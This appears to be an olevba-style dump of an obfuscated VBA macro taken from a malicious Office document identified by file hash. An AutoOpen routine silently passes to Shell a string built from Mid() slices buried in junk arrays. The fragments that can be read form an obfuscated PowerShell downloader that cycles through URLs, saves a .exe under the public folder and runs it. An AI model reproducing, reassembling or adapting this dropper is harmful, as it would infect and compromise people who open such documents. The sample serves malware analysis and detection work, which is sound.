Filename     : ./macros/f8d9ffc5ec38f6f0f367fcc41184d32ab4b5e8a988958b38c9197ceb1b5a4f6e
OLE stream   : Macros/VBA/KfsUkXdVQ
VBA filename : KfsUkXdVQ.bas
----------------------------------------
Attribute VB_Name = "KfsUkXdVQ"
Sub AutoOpen()

uMPBwjXXw = Array("bFOfKMfO", "jWLDwfmw", "XZQwjXpO", "HsPrMbrj", "NnMnszif", "jctdwrwj", "dCbHHaNE", "PzYRwoBH")
icqJTzGau = Array("kNHiMRPu", "iNJAkcma", "HXsZNiua", "mwUBoMiw", "BMXMFaDi", "IWOarGuA", "DiLbOAhB", "TjrNzOFV")
jNzYFZUhT = Array("KQqUTjfE", "UzFACiAi", "VtZiqkuR", "srdGVviO", "iIDjrjzw", "MJcQzVjf", "ztjfuzdZ", "WYccFYiZ")
Shell$ srcFRSfMG, 0
TrWuiQnpu = Array("cVhIdRXL", "wHcLwUff", "iMSEXrna", "DwIwmBiG", "ukRdvRsH", "EQHRGNVW", "rOzEVkXl", "iGEhJYZw")
YVRNCBjMT = Array("LzGjVTqb", "lHXBikJN", "fvoNLzfr", "KtkvHUpi", "mkJlRBMn", "NFYRButk", "IAWGuzHN", "TOYciuTR")
RsOubYwii = Array("BzGZOqQz", "znHzjknc", "vRCdjETm", "GAIjzJjD", "sXtABoFY", "IdiHLThI", "bSfHuAww", "fTSNhjzq")
End Sub
Function srcFRSfMG()
qDQHpBj = "ikDPXHGSbtMhHVzAFptGLfibzdSiwnrRBFKUFJuZEcJlJpQXzlpBjKaNwGAZGNWoBvfBKfuwvTBjVzSINCo94Y1Zc43oS4C"
bJCWkTK = Array("PUvijPNR", "kPTQoMhi", "AfsHbtFK", "GXQYBEEv", "EUzwSBnF", "tVzcviCD", "zTGzDMhW", "OkXJwoPf")
Pjizp = Mid(qDQHpBj, 8, 74)
zkTvHhJkpfi = Array("JqfzmcIi", "XrQUfuvR", "UwwKoSaz", "vjzMOObw", "ZBNjECLh", "qYdNSNjU", "UHmirOuq", "QfBGcvTJ")
iwblmbScQwR = "PzhGbbCAphjzjYZRqDwGlNOflNVwGTpHPHCBiBfJnfjh82wqb1uTjAm6iCkPmGYcrKXNn91w1PoTmw"
jFHKFO = Array("zKCIsAkH", "UjwnHqVt", "LlXdQLwD", "TXbzzjad", "NrDrouMa", "mcjmnlEa", "HBkRlKFm", "LwpUZnIn")
LsZrEJt = Mid(iwblmbScQwR, 2, 42)
jMMcoOIw = Array("jHAfKsIn", "XMfqAbsL", "CwMjoUrX", "kOqzzBOU", "osjraucd", "mBNBCqDF", "bWkDWkZL", "QdvvCJnW")
CFWwzhWs = "WWi3NGbwHUNuiXBWrAIvGfOwOrnkuNiNrmcuEjIqkWSuwhVqCcHjIYzDDkYNjaWvbADsvGRIsRLjNUCjWziSFL0fkIniq2n38c9ACiFi84BibEVc"
UXtQR = Array("jTVDKKXc", "OVLSRRzq", "wTFEBPat", "XYjnARiG", "HPDpsiOa", "knCmDXCZ", "KmCkZMuR", "tcflbjbz")
PkGhWcZhinD = Mid(CFWwzhWs, 11, 75)
cSdkDVKXT = Array("vsTjhvVd", "NMBdQDlU", "GjHzqcBJ", "EjsqMRfh", "HNsazdSm", "mYLkJOhY", "kIPQHOpT", "qKcADfRw")
MUdOPi = "2FYLmsBhHPQWtkKKbUIKfrYOjhkVHUrzDKNJkJJWWrZXKJhLAPQQrLqaqFcFIjamXTSiXBaSKlnnRAEZzYUrEbFrTmSijDOqRmArrwowozGFYDIqADFjLiiwNbOkjvlGWwWfANiBkVCGUzTQibidwfiiDDdPjDPtMzjbjdqnVEzqfbbNHzCT0nfa"
zdCvr = Array("qQQQYYKk", "ZjdTNSJT", "rrfaqQGP", "mOFYLpiw", "qHnYmELr", "iKzSVwmE", "vSkYMcVa", "KBdKTmYk")
FKbwoKORwH = Mid(MUdOPi, 4, 174)
qhnIJ = Array("jRCHoroW", "zcYfSmAo", "hqiUMhvz", "WMbvTkmI", "OCNbdwRu", "qtUdoCUk", "PsuWCzPz", "WFlcPsCM")
QljsOjWd = "HRifLRYkw3qMkOFoJCisCHdukXYDTAEaHpkEHHDZEjwOs"
woqZhdi = Array("iUTzHoCE", "uWXjOshH", "cRPnvGTO", "BwcDdjzv", "CXODGmXw", "WHlwAjvS", "IQjoEwXX", "AEzKLwbK")
ulYsMwjzKS = Mid(QljsOjWd, 11, 29)
ljwvOOz = Array("QwvFaDXv", "bRIFNOcw", "FqcnSFlF", "hOwCLHno", "mOHotBwF", "QmqsXZlf", "nYLjUYMK", "LqYMGUkT")
MaGcjb = "5X2GMlBFDFpaNzffhPAszadzkcvDlAdjiabYuiidVOaiqkWtwCSQRSBUuFJuUfjdsOcnVGlwlXWjzwJzGBFjhMOPZHioZjHnsvEHm4qhBbPdUrS00"
WlNpCRc = Array("LiQCvoph", "mIGqFiwN", "QHimBzdD", "kOKldDBQ", "dJdolulK", "kRRfhmow", "rQRtLwUL", "ANRjdEEj")
bcoroz = Mid(MaGcjb, 13, 82)
uKOcLJbhJ = Array("itHuuoTw", "WPvHPDZQ", "oXKNDkTR", "QNodNADR", "rNIlbHkC", "HMfoSCzh", "wawEnnct", "aqihAqjW")
lrbhlDFlP = "iOPtdtSvMVGjwSOwCHmGTIjZhAshSomTIcnjFrGlMWjvjWiIDzaQQzKUocPwjGzFAhaWiiqLBAuwblqKWjiVNWDLRTudbJntwWSwkWoTK9uE"
oXOqEL = Array("BmmcGNsK", "JRTaVWBf", "JjuhTZNY", "pmXKQatH", "ZswhTnRi", "KkcGMrwi", "AismpQlc", "YOmUqhti")
BShBjwsDrvt = Mid(lrbhlDFlP, 12, 83)
QFPEwQMuc = Array("mWXzadai", "RMXqjMlE", "olfLwSVV", "lYHqkNKl", "EHGYMicO", "rYzwUGPY", "vCulXjST", "BBNBVkwE")
zjicdjLQit = "83bwKjwXMkPEXzXiDzPJi8Lw3b2mkzfQcBsEiDAlvjrdhAjSKwuXFtXPjUdVvKmirG"
UKzNiAbolPz = Array("FwIljPvL", "BNaDmMfB", "lzYlhGMr", "wjMvSkii", "vSoCitZM", "TGPqjzma", "jIWHhjIw", "kRpwCAsQ")
XkGFpCS = Mid(zjicdjLQit, 33, 30)
kiWhsTpc = Array("UtsCYMFS", "odMKlpPF", "osDKRuGi", "sREAAwXP", "BzIAJdrp", "jNItzqfF", "bPRQDKDZ", "nOKHHFRq")
mSwIF = "9650OdvbdJSqlrUJilCUOFFtWsZkYWXioYpSGjzBpmsnndDQuwTQjhREhlKVELDHmkBNBCDClAfbMSFtoIpZCGBHHlkUWizdjlADbqOsvRijBprPfRjvWdEfitGQRifHDBsbSCoDIQCSDtZjd0NNs"
pvHLZ = Array("JirJIjGT", "zQXGOvRa", "tOGZRppP", "NKwoRwIi", "AMYjdDPI", "chHhEOtX", "PWLSwwAU", "sbvwnSCA")
vLcDUq = Mid(mSwIF, 5, 130)
AwUot = Array("CwMsKUEi", "lFUisbAb", "iDFLctif", "vGnzISwm", "rjSQVODp", "oViiOUMY", "siAHzbVI", "ThzEhFVS")
dEmiCrEp = "E5KlpfiTOo2Bm0GnokAQHqMimCqDlzRBKzcTsBvtMCmHKGTjGBwckdztZFGYjdkHNnmJUGLDCGEFDEXfiGzjhjHa4fap"
bZjcjzrAhr = Array("OpjlLskE", "ASGYQQlz", "LqIFjjWP", "kDpifakT", "mBkwNKJE", "LwuqPbEG", "vhPtdRJi", "SRAIDFZa")
OXGsmkQbb = Mid(dEmiCrEp, 19, 66)
joMqltKwKF = Array("cnFaivqY", "XuUTWjEv", "RCmLiHQX", "tHLFAiff", "mlYMLMBU", "FJqzmtvU", "zvBvIWAV", "WhhbklXp")
wtVrSlqPow = "WcACLVPfWNiLLIY5VWqWTG4fv4XfKGKBEvzrBmtVWhifzWLFNKzLIfYBrZkBQndiuDmUbfKRtzjidlfMmhSAJztYWwAsO3vzpY"
ohnaWzqEB = Array("iAYAuOGv", "civqUlXk", "EBDOpcqB", "oAavDHEd", "JCRYvMkG", "wOqibzBV", "tfCordTB", "JXLtoKsV")
SGwSbipF = Mid(wtVrSlqPow, 28, 64)
cliBzwI = Array("CpMVYWTJ", "JbDwfRwS", "QrdTrjhv", "EQjYSzwD", "YiXiMUOu", "YALwYTMi", "UEKTNXpW", "HRQHqurJ")
BvHINZ = "54HKithllJNFGUfGtFRjwviaJcGtKAwUUSwhYDWzAZtqUXjdBACdCzfhGjBCnoalKsknXwhqiUjXCsGlscsKzVRVmPbrBUKMzHfbnwFCSMuiSIiOaPJLwPnoaOAIXpoOKUYuMfwwWpslTpkKK7czisnRwX"
bojthj = Array("zHazciDB", "dtiTCiOf", "ToiEpojE", "SRnjjNus", "KYCfzVMz", "qErwjJvS", "ojFzXNRI", "YWfLvURP")
EEjRfi = Mid(BvHINZ, 3, 138)
hnCbUEX = Array("fcFRLQXQ", "DHhttrTq", "zQadwifB", "DmcQwvJZ", "SwOkmwmh", "wdjAnYTo", "htFUqOdz", "zDOYnGSH")
kGCmoUTc = "48ZAF9cW3TLGCrbPHOHzcoSLGEWOwizSIcQXJzUjzGwQHKDlsBOiwWhzrqmYuoaQttzaaDGJuXzVrCEvAlWuQTVmuRfSLvpIjfXONdKovEjYWLHplqYJSfAZXKfJXnzwiqpMiqiWahwLjwQjJqhVXfqAizqCwBQIHkqfVvKvHBikjppauwL0"
RdVkz = Array("KFAbYtus", "XzEcjKCO", "NtizKXNM", "jGIBoChw", "ZcbMGENS", "BGijjnVm", "bmhBnKJm", "snvRlsDU")
rdnfLhh = Mid(kGCmoUTc, 11, 168)
jKjElYlLCOv = Array("fszVoZHE", "dozAXjzb", "iVZTLdvU", "UtipuJiu", "AvIFjpzb", "OjwlSGjl", "LvwGhoPB", "wiAuuRJT")
qlIwjPUvnY = "ARnfM206Mdr7wbjCikMRlKwPjUqAYvwfdYfXwkjCvRNoGXBNrMWXKYCELEoaViaAZJPMwLDtBKWUzKJMTdJLZZVEVbMuwJjQqMOzHpRfIdWzBhHBvbGrVObAoKqUzJwsWGukGdi7hQ"
iUzbHLtmrw = Array("YjYYkjMT", "EzOEVNXL", "HMOKFCFj", "SjWAKYmj", "XnEtiChD", "JkKliPrm", "iAWLvdEW", "drFAKLIf")
jEiFWn = Mid(qlIwjPUvnY, 14, 115)
ovdbIwMuT = Array("ipCaLAIU", "SpYwKhDO", "qGHHQRqA", "OhdwjJQo", "YlwWCXCK", "tLwddCaR", "jVDOisTM", "zBMdXKnJ")
zDvrwCiJi = "XtMYPqzHDfTcZWirYzZWRURcvBrSMRqtNwhMQEvdAhCzOPdluCLXzjBjmwMotmvpNaPdpWaTEvVkRSNfXGXJFSthuAZSsGkOlMmnAAvYbsTDKROUkjQnOlkujhiowIazLGwEjaiXKwhNzpWcmFhLqwzAcrHSRGcTRVsDTJoKCscQDWvq8cdvwmwGNTN8T2DV3K80d"
JfaBahHN = Array("jQZOkrKl", "qMLAwpTJ", "FRZKfdiw", "ISjXFOpH", "wRjsSYFd", "olRjBYBD", "wCviAOXF", "mdFRLnfc")
znhJTm = Mid(zDvrwCiJi, 11, 166)
LdioG = Array("SCtNtDUj", "GVqkvCRA", "DGwtZSJc", "BsHuJDmZ", "KhSZpRPl", "hYUTJsmp", "VzXIvNYz", "tRLBwaZC")
FwONaEGZH = "IO70MlrSCUbtUOtabSiLlnFcauUNcYBiOSRjrzzEtzYhiMLtzNCNoqUmubJWnEqiSsiBzJjcSdRlPXwNiaOOVouYzfoPpcRpJtPliJwpiauKYjWWdwoMpbIiwFDSUTmqMccVIMfZiZkvtjAOIRltoEzilkncGiUKnDwvGBORQPhQfj2bZ3zuvTnmLNW4p6V8GTV2TBi"
BqfGAOk = Array("zhCBYVbN", "GUrkhZtX", "iEiJbwPk", "GkniiZpw", "lqOBEQYE", "vizaYBKJ", "QUAsfHjw", "SRunizjh")
WaFYn = Mid(FwONaEGZH, 8, 165)
jGpFiciOZQC = Array("cVoWiwOz", "fBsDtBrQ", "kPGwnkmd", "iAAEjUDK", "AscWpWIm", "GCCMjHRw", "ZWsEuQls", "jKsiwKRL")
qnJVkIsH = "kGYOJWj2i3sujKzqirizVzJUSrGVjOJONTqtGPIrsBosMMdLqLNnWNKvnaAKcAODwzhQTEjSjnEULQIGVRzbdsom"
KouIdzdv = Array("XlDTJJkF", "XLwOrSEt", "RcwVbQXb", "rNYEmEkM", "lzYfMcLZ", "iWdnNKwk", "bhNJaBAG", "ObcvlfSS")
MjDIlhAmP = Mid(qnJVkIsH, 12, 69)
IkSHK = Array("EQBktjEG", "foHrkKlV", "SGhiWQOV", "JOzjjDRV", "nQBbkNjW", "jHZvRQwU", "jOcBwMZn", "CfbilXWb")
ZfQZTszM = "8JhZTfIpJ8wmWcsV3A3oVKkzikM87tnvWKjRfuXTKPzqsZiYtqUhapdfBGYMZE"
rbiEMUobYuD = Array("dzksLIHD", "fzJTtRic", "uGUPhajz", "ajUkCvMk", "LNzNXZIL", "lcpbawwf", "jNQHrqDD", "QkSioXAj")
APBIuPwHIL = Mid(ZfQZTszM, 30, 30)
joMZV = Array("hsAbXnzN", "wZDTihZC", "wmXEksvp", "kMZnINvF", "jqWRutHa", "vRwdKHRT", "TsfVYjQp", "zKqLNLFk")
KrRrKrbz = "uwQXiDXLoPIjjhLcwZjiYEUwPYYjnajawLarkzVWRPTOLuEGcTz9pjfSpMzjSFMsnQKvfT1Ol"
XzhMKEp = Array("wrCEPMqp", "nmSGzQlj", "czYnzHzl", "GjZKMumN", "GnjnSiGQ", "SDzEdiPG", "ZvZBOimp", "tQwinfct")
nbMTHJtIkc = Mid(KrRrKrbz, 2, 42)
kEiosKrrCt = Array("mQciOXoS", "bpjjvKIM", "dkbSiXuQ", "BMVCwqsp", "hqvvWowo", "AcYdiVjV", "dIskrvkO", "WLcCBmWk")
LfSWNvu = "ZB5Zuu62wXCl8IfocCJAobikFdaRtdXCEicVCwwYnRunBp5zHh"
ZwjQwLpUdb = Array("lOhpRiiq", "iTmDmFmz", "CJkoBOBE", "YHlVvNKa", "hFzOwwui", "VnbzUKhl", "ScvGLhQX", "MdRJwMvU")
uVzJIj = Mid(LfSWNvu, 18, 28)
uuGzb = Array("ijTHojwN", "wJjsctLH", "NusKHJrO", "fpUBsfXU", "LmcdZXMZ", "XDWlcjmL", "QDdJTGOU", "rEbwPwVR")
tAURwdJUp = "6mTjLJidikcN6uzvswiBpQjzitooIC9VBz"
vikKObUUc = Array("kuOAKjGp", "qJwrLwcf", "tUjATstP", "jTuYcaDZ", "rMQrLrjD", "AtptBlOM", "fvjuVSzr", "AwQqmiNP")
lmrqp = Mid(tAURwdJUp, 20, 6)
FDKbfdzoli = Array("PJWjLbYZ", "TIqcNFlm", "tqcbBpzO", "FlMTHDYw", "OMuFfDAS", "iJdAmZsr", "jGjfDwca", "KHbZOFSQ")
UPNKKiORt = "IidWFGXbuBwHiYGOPPDNtDlEawbdriiPEKjNjrvnYAqoOOFFPzGoHEarrXjIiujPXjDTptiXTPotNwpLrWOsXqHAksVMHnIiRaRiLlQWUiUrPjiuhXRIfqrhYCizXRPjGKbmfHAFFsXpVQlDNafkVAzaikJIDTwCSolFErPZjpwWzr9fSmZmDD9L3zrB8C6"
vttoEW = Array("zmKuoUNb", "DbFJKnXw", "tEpnAwop", "OXiikNbA", "jWtovARz", "duwDKjrQ", "YbfUOXiw", "wUjQmfrq")
ZFvpTE = Mid(UPNKKiORt, 5, 164)
nlRhsfLw = Array("PjtdNjNq", "CwFPCOGr", "lqcJEMdw", "EoKJfXBT", "FIZldJmA", "EuBqbFvF", "UrWCfPtC", "DvZZZDLf")
DjSkMDXFj = "7JrJicRajuNtaoRwtwdlcVFRtVoFzBHFhUVikwbNlXcAzPzdAhCaASDMnoWvtaJCunuzjiOvUQzEsFUiYLFPzjFORIuvbjTLNaGJVAwRTGGjTwTiTsWiUuDNhffYnSUnwnqSwKIYOnwsaVvSoMbiJlqTXtcpUXdAlSmfHBjJkzThzKmLkMkaqldLwXvFiSEqJvGIjPKndSwMRJVMGQEHnYNvLGTAJPi"
iFQScRS = Array("WnhdPvwp", "vWmGUdXn", "phjiUhGI", "YPVpPIcG", "nAdKfqqU", "jNUUSPNE", "JEiEtrDp", "jYFzZGan")
fZqcBZ = Mid(DjSkMDXFj, 15, 199)
nlnBwfS = Array("bLCrhZVc", "vUkvYMwT", "wclSPtdV", "AJnvHXzw", "OvzCWGjP", "jIYAzMUF", "PcCPqFWi", "hjrXmZVY")
MCzpiXciuHD = "7ZPBSXGJlMXIfwVoYKALXqztJPmHFsYGVhjDQYWANBdnSkuhDFSKhPRmhIwIkwEtnRnwPRYzoAzWNKaYVEEAaOZFPuVIbNPPzjzAzvSlhTVhRvYXhYnjtDTYrhjVwQXbkhZdUqOzYivbA7SSvrojVK"
iIhEVf = Array("XTSzQhYR", "ArFIrJWz", "uiDwvNRA", "Hkwijcww", "zaShENWn", "wjwmRznO", "aOLzkqZK", "CRqfltiY")
MkumvL = Mid(MCzpiXciuHD, 6, 127)
JzMzJzwqTA = Array("RYUjLCMK", "NkOpKjCA", "MjXpumzX", "UFUYVtNu", "XMPVbvij", "kmupBWKm", "VWwzdWFf", "YzLGiooU")
RadGVdpsSbT = "QrXLDnSCLIRijzmmZ4hwlJzYl10u904wYz1tcoPQA1auHdLRz"
jtzrqHUwB = Array("qjUrhXwD", "TAjAFrYw", "PBwkQZRz", "FuMQnCoV", "qWhdAsbP", "aTjwpLIp", "FWVQrjGQ", "RWlmKjQR")
VlfLmnvDEH = Mid(RadGVdpsSbT, 3, 13)
WTsNH = Array("MvQnkbXa", "KSzmKpRr", "MHGpIzOl", "SzJiIncQ", "SSIuuInG", "JItXNUkI", "mXXCwVMN", "hiUlRoRW")
uKmkSAIbGJ = "LtLT1wkufAIpdXmJFzFToYrUKuJJAWSwicuvKwoqMNqjisrjsDpdvjDXPwzzHCiqBFBtCmHGJPGaiHlSDaQzhoAvZWjOBriKizhcqzjGwiUjccpLI"
jFDVtzI = Array("WoAdkiso", "uiPBUBwc", "sjlujIwf", "GWQYJmCH", "itARDcfj", "TOaanwrp", "tQnBGNTN", "qVXOOTfH")
dPtlE = Mid(uKmkSAIbGJ, 18, 94)
wwrPQ = Array("cPuYfisN", "qzshhSmH", "qNPOoRYD", "jwwAGndD", "hEhHOBTk", "zmzWGDGP", "OLDUFCzL", "rqsjisHD")
jLqjnhEzGct = "oOkovniuT3zoXQhCXntIKabZlSSHtsoUVzaDZiVtQbJQMzpRvuwjVvNHwNublMfzsPzwpTBBMjNjQLNocALwwEwakTHLouHEvJXwwrccsuXphiqkAGwkBjDnQYOVLpNSYJnGoQqlYjFBhJsFdXLhvXDOGjjZdGQChFQYqjwjPNLRbBGGfIsoifWBFZzEjQISio"
ZcrjjYWSunA = Array("FBOkYTOn", "PpNMhkMc", "wMurSQOs", "MauZOraN", "XpUjTqnG", "KTiwGqPj", "baFdVGso", "mVYzZpZX")
tPFUf = Mid(jLqjnhEzGct, 21, 172)
LHjvfRJcO = Array("jblOYMkN", "mQBaAwib", "GJFrhiKz", "KXXUQaKA", "MPYLNStQ", "dVAZkhaL", "aZHulTCz", "RoDBpPzL")
smasjJW = "Pq0PKQJqijbcJiFdkvLEdMdDvCVDnULwUCouclOJzwwjwjdVwEWFjWdfsKfzSHDAoKbqpKBzhCHfPwFPZzGjzFPwZICRFQqqvvsnFnjlDXYjPzQvFQYTATDivdQjIjtRMQkTERJlTVjahjibsHMprXqbsJsbWzdTdGTwMwqoGnzimcBLupnAXEZpaIbuYiOTrMwaPjOIajM2b4"
piiGtA = Array("jSdZidOF", "uLiCJkwX", "tAzjVQHm", "nqjuNPVt", "prMuTwPB", "dDHmqibw", "zmZhpbzP", "LrlrwTri")
Wupqs = Mid(smasjJW, 14, 186)
AQstfKGhmW = Array("GLEfkjTm", "wzXntKrD", "cdOQCVdJ", "VRwfcdSE", "KUbOoXjD", "hAMsNzXz", "fsIBzYhk", "huJThoKV")
ndWDY = "IwGHRIIqSobwjSRjGJtVQrkBlqHtjoCbcQIlzIbEqsJsBuEDnSjWhFzPNFWbAOKdlzUTJfiwipiXiszrmDGNEjuWTsXsmzDchfGBaktHklnsbZjVFiowIzZEFzZTto1FdDQ9MNkYjQDJjzBa9k5lL3HfYvFYL"
RalPuCYv = Array("YmPGPUhS", "chwbpQXJ", "hsLQMDMw", "TvOQfkVL", "vozkOFIl", "kSwMBoMs", "nkzmNHBU", "aTmTFQnr")
HJmhzWKfMaT = Mid(ndWDY, 2, 121)
VorKnp = Array("twGhZurG", "LBtLqNtJ", "rthjwrmu", "ntQRiwcG", "vkzYbYQA", "lUCVXdMX", "GRkZuzQB", "JLtjiZYO")

lCUaiin = "RIoYEktlLf2pIsb+Vcb://Vcb+V'+'cbwww.fVcb+VcbloVcb+VcborVcb+Vcb'+'cFJYbiDwJ"
qOiTi = Array("hlNObCmP", "kadwzwaw", "XUXvWQGL", "TEjEOFTP", "DUcwkjIi", "hszdAhVs", "jMRFlJtQ", "iCuWSiBi")
UVWLosYt = Mid(lCUaiin, 15, 52)
LodkLqBuaMJ = Array("AwTILfMU", "uivDNzbC", "pfUCGhGI", "wVFDPiAK", "pzXZPZvu", "YIkKhwzk", "jUIjDdfS", "pKLpaJFP")
LWjJHmjZ = "oCcqfKwOXVcb3Q8zdId9vVSduYbjb"
IrjzJzTE = Array("YnhBaQhJ", "VXWDZouz", "FCjwUuYL", "qNDflRuu", "sIYIzWZn", "KmbTvZXp", "CRWViGji", "OWLNNCYE")
jMHdbG = Mid(LWjJHmjZ, 9, 4)
MrsqoPt = Array("hPnwGZzr", "RQELUlzK", "MQqjwjlq", "iiBkoQrQ", "dSKjcCuS", "JvJzwiYz", "EsvwrScz", "dwRcXOCB")
Gwfts = "RPH8CubhuVcb+VcsO3sDiW9bjfizZiDjBTmuNZiw9"
jkdjihaiX = Array("mPsFwbzW", "oJZzPVIK", "OLkIRQhG", "zfwUdSUi", "aZalJSui", "KQTzijcY", "BZNfbGUV", "hlISfisW")
aUTSnsWWkA = Mid(Gwfts, 7, 9)
FtDWw = Array("SdTwOvCi", "oLDHjWSi", "jjUQnajJ", "NmEqSDZo", "ObXqiNuL", "rqKNBCXt", "FKmIGHdr", "uJjcrMPl")
zdtWac = "3VCVJudmPqT1bqLOGZPwXkDcwh9684Scbw4K+w4KosVw4K+w4Kc'+'b+Vcbtw4K+w4K Z1k_w'+'4K+w4K.ExcVcb+VcbeptiVcb+VcboVcbw4K+w4K+Vcbn.Vcb+VcbMesw4KTtj"
ziVEEAfjJl = Array("dlKASUuI", "mihPiziC", "flOwizdJ", "wwrwDwok", "fFtVSbrX", "HAajnNkB", "OSqClScd", "HBDTdvFn")
XnDhRj = Mid(zdtWac, 32, 103)
IEQIzJFcMFD = Array("HSdAckGR", "uojoZhKk", "jGLSMrTk", "fGwGznLv", "dZOqqYUc", "kzMWGdbK", "sBJMRUcP", "wsUVoARH")
rFbmVdGYl = "Pau0kINhjouD7oNnRNLznowzmCzfd+w4KSplVpzKUCaFzlf"
FEOqjYCB = Array("TnSsIpMr", "tjoNKSJC", "CDWzhQhb", "jGPKqiSR", "RONioljv", "FlAzprfN", "waWfbpAD", "FrMCaCBL")
rnlRCkNCmkX = Mid(rFbmVdGYl, 30, 8)
quRpjDmj = Array("zfilFiFC", "riCXiFld", "KAlDRGzb", "JjuHPKKP", "ElzvRSHB", "PEvhRGir", "lSduhdFq", "jGcYjzmh")
VAPwMAbRrh = "FdO4WkHGvvMnaYcUDOIfEBM8Tu72),[cHAr]92 -CreplaceV'+'cbZXqVcb,[cHAr]39) '+'D6z&( Gw4K+w4KtpvErbOSEPREfeREN'+'CE.TOSTrinG()[w4K+w4K1,3]+VcbxVcb-jOINVcbVcb)w4K).JPZl5sWQ"
jOJVjF = Array("lGtCrTRM", "lEXUQVMu", "wsjZsGVW", "qokbXPEL", "tDHdACAX", "JKRVTNrE", "DsFpjRki", "lWMDjppW")
LikuRkj = Mid(VAPwMAbRrh, 27, 132)
NrEYFft = Array("EoMbDTtr", "svCGaodJ", "XDrBFwOw", "oBlazPKv", "NYwKrKRm", "ikjsjtEs", "raWDZqiI", "ZPnChSrd")
izQcKRSnr = "TRePlacE((['+'CHAr]71+[CHAr]116+[CHAr]112),w4KdBEw4K).RePlacE(([CHAr]86+[CHAr]99+[CHAr'+']98),[sTrI'+'Ng][CHAr]39).RePlacE(w4KD6'+'zw4K,[sTrINg'+'][CHAr]1kvit07Wnm"
vaNczwiWG = Array("iwtOEWZq", "DqPzWsfW", "PtLIIrjH", "wOLomHwk", "LjjiTFaD", "EGjMiFPA", "WnhfvWam", "QlPpLkEw")
iMqGX = Mid(izQcKRSnr, 2, 153)
tJuNvMm = Array("WwMtjwrQ", "oFfzREaP", "nHMGplDK", "jjXklGbj", "FDAEqwEV", "rqOKfNUi", "ZdzkDwEl", "tCJwYGii")
rjLST = "dw9zpEf1kYsnI6cb = ZVcb+Vcb1kenv:publVcb+Vcbic V'+'cb+Vcb+Vcb+Vcb ZXq0w4K+w4KVcb+'+'VcbwHVcb+VcbZXq Vcbab0lQ"
zUtOUM = Array("uAvYZlJO", "diWjPZIs", "RTooSqOE", "vDAXqhin", "fahoazSr", "rmdVdEHJ", "sTusTvjD", "lqcWlmYv")
WJMElw = Mid(rjLST, 15, 89)
lBiBGFiEN = Array("OjzZBWbZ", "XrPAEzVi", "RXUSwsAw", "OpLSpUwO", "FjZjYCuq", "vPdbpVXr", "dBBGAAkW", "jBLMLIkC")
msQSEFbJ = "2JCwVVlX6FzVf75GGcb+Vcb)Vcb+Vcb{try{Z1VcbwCfjCN78oOktKtbXMw"
ZnodoLhh = Array("zEjKQbza", "plpXowlj", "pJDIaADW", "zzPkIFis", "nABYOHCF", "LCRcUNqw", "QXatAAvz", "BKKQMPRk")
KUHWizQTvHZ = Mid(msQSEFbJ, 18, 24)
KfJjHPF = Array("rrQiXhod", "YGWMvwkm", "mKUlULzO", "bHdlUCHS", "jkfImMVi", "wzWBduST", "hLcGOKlf", "tCDQDDJV")
HHljUawu = "P7qD1Fk5ItlAQMwOmjD4qlK3baVcb+Vcbw4K+w4KsVcb+Vcb);V'+'cb'+'+Vcbbreak;}caVcb+Vcbtch{writeVcb+Vcb-hVcb'+'+VcYbn959R29fR"
PTTVzfizXX = Array("BljjsiuW", "dPIdWVCJ", "bHWNCWcs", "atCDqNXo", "LUiPmqVc", "KkPAFNid", "fPfAEcFf", "InFwfqfP")
sRLmnjw = Mid(HHljUawu, 25, 81)
TrEMmJjw = Array("EAmAFcIH", "RPfmwqkf", "lzwYizBE", "czUhRIOt", "GRwClPUj", "PAcfBSXN", "LEGsQNqE", "ziYGIapI")
HNlnawUB = "7NmKbJ6ME6m2pCqvS(('. ((Gv w4K*mDR*w4K).Name[3,11,2]-joiNw4Kw4K) ( (w4K ((VcbZ1Vcb+Vcbk'+'franc = VwUVMkr5kH05Rk"
PIIHVKVz = Array("RNtHLTzL", "NwQaXLfY", "avoffHum", "UKGRZjCX", "VdWHzFwF", "PErcrEjX", "iSFCPHLJ", "TGmBNjlj")
CZuwSzHjZa = Mid(HNlnawUB, 18, 83)
qvmVjDi = Array("vjMHTBRf", "miioHaJa", "bazsjrAB", "RnDNsvNU", "uAOpcPMz", "bIToVtMI", "YNQFaHfE", "jKqfzDmq")
rFpUrFXJ = "HD2zYTcb+VcbitVcb+Vcb(ZXq,Vcb+VcbZXqVcb+Vcb);Z1kVcw4K+w4Kb+VcbkaraVcb+Vcbpas =Vcb+Vcb ZV'+'cb+Vcb1Vcb+VcbknsadVcb+VcbaVcb+VcbsVcb+Vcbd.nexVcb+Vcbt(Vcb+Vcb1Vcb+Vcb, 34Vcb+Vcb3245Vcb+Vcb);ZVcb+VcRNuV1aprkENCaBv9BdmQ5IozN"
RYOAjhOsB = Array("IwLznNDf", "YTnpjaWt", "lFrMwbRZ", "RIRIoOiB", "zmFTABUE", "scXdTrwR", "wFOdOVuj", "hmfiwvrK")
djBdZqRS = Mid(rFpUrFXJ, 7, 187)
hHJkuVn = Array("rhIFlzPr", "zfNswbXj", "TnhvWMon", "GkNKJGXO", "jzoJcnPN", "HhfORMwI", "SwIvzHhf", "sUzAjFhs")
oMcvWWu = "XcbcVcb+Vcbd = Zz94E3T0GmsTLHcjcA3C7hd83V0SvCnN7bwZ98"
zBOqYuwMciK = Array("ilEINwiL", "wakGSmmN", "TwETDGnT", "ajRfzwSw", "MtpDlYYl", "EnbVMSwa", "Wbfsfizc", "wkihhzOA")
fPrGpRK = Mid(oMcvWWu, 2, 15)
zNEPUiI = Array("dXkqwYYF", "CNUUHMcT", "wsiRVMKb", "CAjoCBfj", "QzwdolvH", "jPuYophm", "kiwYvwYR", "MJowpkCA")
RtufP = "am;ZYKpXjUFT6fwPXaXmhWVbGHa2Q4"
JfwMXMdM = Array("MvATGCYX", "whVBltLr", "EhGkbDar", "zwMhhDJX", "jJJZAHMB", "ovISTnOC", "zUUBPZrI", "VJWIprpt")
hbLFAKjwjzY = Mid(RtufP, 2, 3)
fRwujwMz = Array("OKqDEjhH", "NVWjGELP", "QYZPsOOh", "sfAKzuJa", "jmwIqtbs", "tqdVVBbS", "DNSFAppA", "vJLYjWKT")
HidQC = "jPDSmRA775RmhVX8zuflcrYVcb+VcbwVcb+Vcb.laraoVcb+VcbrganizaVcb+VcbsyVcb+VccinDL"
wIIptDYKY = Array("wEwMjwUD", "oVBBqHmF", "qkUcojmY", "dCYqISMm", "NimoAbNp", "isEYmjXA", "JUsmQoSM", "RajiXivV")
NFEsiXmfjD = Mid(HidQC, 24, 50)
psTEDcQl = Array("tzZfMBqv", "qYjLbzcG", "mpFYffqi", "EiiFikcf", "MPQjliBk", "Wdpiszot", "lCwstnlO", "HvaiXkQG")
